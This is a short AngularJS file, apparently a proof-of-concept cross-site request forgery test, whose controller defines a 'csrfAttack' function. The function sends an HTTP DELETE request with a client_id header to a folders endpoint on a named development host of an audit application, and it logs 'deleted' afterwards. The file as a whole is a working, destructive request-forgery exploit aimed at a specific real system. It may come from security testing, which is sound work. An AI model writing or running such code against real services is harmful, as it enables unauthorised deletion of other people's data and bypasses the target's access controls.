var app = angular.module('csrfApp', []);

app.controller('httpAppCtrlr', function ($scope, $http) {

    $scope.csrfAttack = function () {
        $http.delete('http://dev.ist.pwc.com/auditx/api/folders?node_id=1688', {
        headers: {'client_id': '1'}})
            .then(function (response) {
            // $scope.names = response.data.records;
            console.log("deleted")
        });
    }
});
